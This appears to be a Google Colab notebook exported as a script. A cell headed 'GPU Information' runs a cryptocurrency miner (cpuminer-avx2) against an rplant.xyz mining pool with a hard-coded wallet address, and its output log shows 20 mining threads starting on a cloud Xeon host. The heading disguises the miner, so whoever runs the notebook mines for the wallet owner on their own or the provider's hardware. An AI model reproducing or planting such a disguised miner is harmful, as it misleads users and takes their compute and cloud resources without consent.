# %% [markdown]
# <a href="https://colab.research.google.com/github/blindspotx/MBC/blob/main/MBC_Colab_25GBRAM_GPU.ipynb" target="_parent"><img src="https://colab.research.google.com/assets/colab-badge.svg" alt="Open In Colab"/></a>

# %% [markdown]
# # GPU Information

# %%
! ./cpuminer-avx2 -a power2b -o stratum+tcps://stratum-eu.rplant.xyz:17022 -u MbJgkWJTJZpnMqJxDeha5K29BgnNAX6qTZ.xyzzy
# Out:
#          **********  cpuminer-rplant 5.0.11L-avx2 ***********
# Found 40 logical processors across 20 physical cores
# [2021-01-20 04:33:17] yespower-b2b parameters: N= 2048, R= 32.
# [2021-01-20 04:33:17] Key= "Now I am become Death, the destroyer of worlds"
# [2021-01-20 04:33:17] Key length= 46
#
# CPU:            Intel(R) Xeon(R) CPU @ 2.30GHz
# SW built on Jan  5 2021 with GCC 10.2.0
# CPU features:  AVX2    AES
# SW features:   AVX2    AES
# Algo features: SSE2   SHA
#
# Starting miner with SSE2...
#
# [2021-01-20 04:33:17] CPU affinity [!!!!!!!!!!!!!!!!!!!!....................]
# [2021-01-20 04:33:17] Miner thread priority 0 (nice 19)
# [2021-01-20 04:33:17] For best hashrate on algo power2b miner will use only physical cores
# [2021-01-20 04:33:17] 20 of 40 miner threads started using 'power2b' algorithm
# [2021-01-20 04:33:22] Stratum connect stratum-ru2.rplant.xyz:17022
# [2021-01-20 04:33:22] Extranonce subscription enabled
# ...
